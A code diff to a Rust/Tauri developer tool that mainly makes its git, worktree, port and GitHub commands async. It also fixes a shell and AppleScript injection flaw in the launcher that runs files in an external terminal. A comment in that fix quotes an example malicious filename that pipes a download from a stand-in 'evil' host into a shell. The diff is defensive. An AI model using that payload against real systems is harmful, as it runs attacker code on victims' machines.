@@ -14,7 +14,7 @@ pub fn home_dir() -> Result<String, String> {
     std::env::var("HOME").map_err(|_| "HOME not set".to_string())
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn list_projects(root: String) -> Result<Vec<Project>, String> {
     let mut out = Vec::new();
     let entries = std::fs::read_dir(&root).map_err(|e| format!("{root}: {e}"))?;
@@ -73,7 +73,7 @@ fn git(path: &str, args: &[&str]) -> Option<String> {
     Some(String::from_utf8_lossy(&out.stdout).trim().to_string())
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_status(path: String) -> GitStatus {
     // A single `git status` call yields branch, ahead/behind, and dirty state in
     // one process. Doing three separate git invocations per project caused a
@@ -125,7 +125,7 @@ pub struct GitChange {
     file: String,
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_changes(path: String) -> Vec<GitChange> {
     git(&path, &["status", "--porcelain"])
         .map(|s| {
@@ -182,7 +182,7 @@ pub struct GitFile {
 
 /// Richer change list: separates staged (index) from unstaged (worktree) state
 /// using the two porcelain status columns.
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_files(path: String) -> Vec<GitFile> {
     let Some(out) = git(&path, &["status", "--porcelain"]) else {
         return vec![];
@@ -210,7 +210,7 @@ pub fn git_files(path: String) -> Vec<GitFile> {
 
 /// Unified diff for a single file. `staged` shows the index diff; untracked
 /// files are shown as an all-added diff against /dev/null.
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_diff(path: String, file: String, staged: bool, untracked: bool) -> String {
     let args: Vec<&str> = if untracked {
         vec!["diff", "--no-color", "--no-index", "--", "/dev/null", &file]
@@ -230,28 +230,28 @@ pub fn git_diff(path: String, file: String, staged: bool, untracked: bool) -> St
         .unwrap_or_default()
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_stage(path: String, file: String) -> Result<(), String> {
     git_try(&path, &["add", "--", &file]).map(|_| ())
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_unstage(path: String, file: String) -> Result<(), String> {
     git_try(&path, &["reset", "-q", "HEAD", "--", &file]).map(|_| ())
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_stage_all(path: String) -> Result<(), String> {
     git_try(&path, &["add", "-A"]).map(|_| ())
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_unstage_all(path: String) -> Result<(), String> {
     git_try(&path, &["reset", "-q", "HEAD"]).map(|_| ())
 }
 
 /// Discard worktree changes for a tracked file (restore from index/HEAD).
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_discard(path: String, file: String) -> Result<(), String> {
     git_try(&path, &["restore", "--", &file]).map(|_| ())
 }
@@ -262,7 +262,7 @@ pub struct Branches {
     all: Vec<String>,
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_branches(path: String) -> Branches {
     // `symbolic-ref` returns the branch name even for an unborn branch (one with
     // no commits yet) and only fails on a genuine detached HEAD — unlike
@@ -280,12 +280,12 @@ pub fn git_branches(path: String) -> Branches {
     Branches { current, all }
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_checkout(path: String, branch: String) -> Result<(), String> {
     git_try(&path, &["checkout", &branch]).map(|_| ())
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_create_branch(path: String, name: String) -> Result<(), String> {
     git_try(&path, &["checkout", "-b", &name]).map(|_| ())
 }
@@ -296,7 +296,7 @@ pub struct Stash {
     text: String,
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_stash_list(path: String) -> Vec<Stash> {
     let Some(out) = git(&path, &["stash", "list"]) else {
         return vec![];
@@ -310,7 +310,7 @@ pub fn git_stash_list(path: String) -> Vec<Stash> {
         .collect()
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_stash_push(path: String, message: String) -> Result<(), String> {
     let mut args = vec!["stash", "push"];
     if !message.trim().is_empty() {
@@ -320,19 +320,19 @@ pub fn git_stash_push(path: String, message: String) -> Result<(), String> {
     git_try(&path, &args).map(|_| ())
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_stash_pop(path: String, index: u32) -> Result<(), String> {
     let r = format!("stash@{{{index}}}");
     git_try(&path, &["stash", "pop", &r]).map(|_| ())
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_stash_drop(path: String, index: u32) -> Result<(), String> {
     let r = format!("stash@{{{index}}}");
     git_try(&path, &["stash", "drop", &r]).map(|_| ())
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_commit(path: String, message: String, push: bool) -> Result<String, String> {
     if message.trim().is_empty() {
         return Err("Commit message is empty".to_string());
@@ -348,7 +348,7 @@ pub fn git_commit(path: String, message: String, push: bool) -> Result<String, S
 
 /// Commit only what's already staged (the index) — used by the Git panel where
 /// staging is explicit. Fails if nothing is staged.
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_commit_index(path: String, message: String, push: bool) -> Result<String, String> {
     if message.trim().is_empty() {
         return Err("Commit message is empty".to_string());
@@ -461,7 +461,7 @@ fn resolve_via_login_shell(bin: &str) -> Option<String> {
         .map(|l| l.to_string())
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn detect_editors() -> Vec<String> {
     EDITORS
         .iter()
@@ -474,7 +474,7 @@ pub fn detect_editors() -> Vec<String> {
 }
 
 /// Detect the Elyra coding agent CLI (returns its version string if present).
-#[tauri::command]
+#[tauri::command(async)]
 pub fn detect_elyra() -> Option<String> {
     let bin = find_bin("elyra")?;
     let out = std::process::Command::new(&bin)
@@ -501,7 +501,7 @@ pub fn detect_terminal() -> String {
 
 /// Run an executable file in an external macOS terminal (iTerm2 if present,
 /// otherwise Terminal.app), executing `./<name>` from the file's directory.
-#[tauri::command]
+#[tauri::command(async)]
 pub fn run_in_external_terminal(path: String) -> Result<(), String> {
     let p = std::path::Path::new(&path);
     let dir = p
@@ -513,38 +513,51 @@ pub fn run_in_external_terminal(path: String) -> Result<(), String> {
         .map(|b| b.to_string_lossy().to_string())
         .ok_or_else(|| "invalid path".to_string())?;
 
-    // Single-quote the shell parts so spaces are safe.
-    let shell_cmd = format!("cd '{dir}' && './{base}'");
-
+    // The directory and filename are passed to osascript as **argv**, never
+    // interpolated into the script source, and the shell command is assembled
+    // inside AppleScript with `quoted form of`.
+    //
+    // Interpolating instead (the previous approach) was injectable twice over:
+    // a filename containing `"` escapes the AppleScript string literal, and one
+    // containing `'` escapes the shell quoting. Since filenames arrive from
+    // whatever repository you cloned, a file named `x'; curl evil|sh;'` would
+    // have run arbitrary code on right-click → Run. argv + `quoted form of`
+    // keeps both layers data rather than code.
     let script = if std::path::Path::new("/Applications/iTerm.app").exists() {
-        format!(
-            "tell application \"iTerm\"\n\
-             activate\n\
-             create window with default profile\n\
-             tell current session of current window\n\
-             write text \"{shell_cmd}\"\n\
-             end tell\n\
-             end tell"
-        )
+        r#"on run argv
+             set d to item 1 of argv
+             set f to item 2 of argv
+             set cmd to "cd " & quoted form of d & " && " & quoted form of ("./" & f)
+             tell application "iTerm"
+               activate
+               create window with default profile
+               tell current session of current window to write text cmd
+             end tell
+           end run"#
     } else {
-        format!(
-            "tell application \"Terminal\"\n\
-             activate\n\
-             do script \"{shell_cmd}\"\n\
-             end tell"
-        )
+        r#"on run argv
+             set d to item 1 of argv
+             set f to item 2 of argv
+             set cmd to "cd " & quoted form of d & " && " & quoted form of ("./" & f)
+             tell application "Terminal"
+               activate
+               do script cmd
+             end tell
+           end run"#
     };
 
     std::process::Command::new("osascript")
         .arg("-e")
         .arg(script)
+        .arg(&dir)
+        .arg(&base)
         .spawn()
         .map_err(|e| format!("osascript failed: {e}"))?;
 
     Ok(())
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn open_in_editor(editor: String, path: String) -> Result<(), String> {
     let launcher = EDITORS
         .iter()
@@ -594,7 +607,7 @@ pub struct PortInfo {
 /// List local TCP ports in LISTEN state (via `lsof`), one entry per port,
 /// including each owning process's working directory (so ports can be attributed
 /// to a project).
-#[tauri::command]
+#[tauri::command(async)]
 pub fn list_ports() -> Vec<PortInfo> {
     use std::collections::HashMap;
     let mut map: HashMap<u16, PortInfo> = HashMap::new();
@@ -660,7 +673,7 @@ pub fn list_ports() -> Vec<PortInfo> {
 }
 
 /// Send SIGTERM to a process (used by the port dashboard to stop a dev server).
-#[tauri::command]
+#[tauri::command(async)]
 pub fn kill_process(pid: u32) -> Result<(), String> {
     std::process::Command::new("kill")
         .arg(pid.to_string())
@@ -689,7 +702,7 @@ pub struct Container {
 /// List Docker containers and the Compose working-dir they belong to, so the UI
 /// can show a per-project container badge. Returns empty if Docker isn't
 /// available (no daemon, not installed) — best-effort, never an error.
-#[tauri::command]
+#[tauri::command(async)]
 pub fn list_containers() -> Vec<Container> {
     let out = std::process::Command::new("docker")
         .args([
@@ -738,7 +751,7 @@ pub struct StepResult {
 /// stale documentation is flagged instead of silently rotting. The child is
 /// killed after `timeout_secs` (long-running steps like dev servers should be
 /// marked `no-verify` in the fence instead).
-#[tauri::command]
+#[tauri::command(async)]
 pub fn run_step(cwd: String, command: String, timeout_secs: Option<u64>) -> StepResult {
     use std::io::Read;
     use std::time::{Duration, Instant};
@@ -922,7 +935,7 @@ fn worktree_location(repo: &str, branch: &str) -> std::path::PathBuf {
     parent.join(format!("{base}.worktrees")).join(safe)
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_worktree_list(path: String) -> Vec<Worktree> {
     let Some(out) = git(&path, &["worktree", "list", "--porcelain"]) else {
         return vec![];
@@ -979,7 +992,7 @@ pub struct WorktreeConflict {
     pub worktrees: Vec<String>, // branch name (or short HEAD if detached)
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_worktree_conflicts(path: String) -> Vec<WorktreeConflict> {
     let trees = git_worktree_list(path);
     if trees.len() < 2 {
@@ -1015,7 +1028,7 @@ pub fn git_worktree_conflicts(path: String) -> Vec<WorktreeConflict> {
     out
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_worktree_add(repo: String, branch: String, base: Option<String>) -> Result<String, String> {
     let branch = branch.trim().to_string();
     if branch.is_empty() {
@@ -1046,7 +1059,7 @@ pub fn git_worktree_add(repo: String, branch: String, base: Option<String>) -> R
     Ok(dir_str)
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn git_worktree_remove(repo: String, worktree_path: String, force: bool) -> Result<(), String> {
     let mut args: Vec<&str> = vec!["worktree", "remove"];
     if force {
@@ -1077,7 +1090,7 @@ pub struct PrInfo {
     checks_pending: u32,
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn detect_gh() -> bool {
     let Some(bin) = find_bin("gh") else {
         return false;
@@ -1090,7 +1103,7 @@ pub fn detect_gh() -> bool {
         .unwrap_or(false)
 }
 
-#[tauri::command]
+#[tauri::command(async)]
 pub fn gh_pr_list(repo: String) -> Result<Vec<PrInfo>, String> {
     let bin = find_bin("gh").ok_or("gh (GitHub CLI) not found on PATH")?;
     let out = std::process::Command::new(&bin)
@@ -1156,7 +1169,7 @@ pub fn gh_pr_list(repo: String) -> Result<Vec<PrInfo>, String> {
 /// "squash" | "rebase" | "merge" (defaults to squash). Deletes the remote
 /// branch on merge — the local worktree (if any) is left for the caller to
 /// remove separately via `git_worktree_remove`.
-#[tauri::command]
+#[tauri::command(async)]
 pub fn gh_pr_merge(repo: String, number: u64, method: Option<String>) -> Result<(), String> {
     let bin = find_bin("gh").ok_or("gh (GitHub CLI) not found on PATH")?;
     let flag = match method.as_deref() {
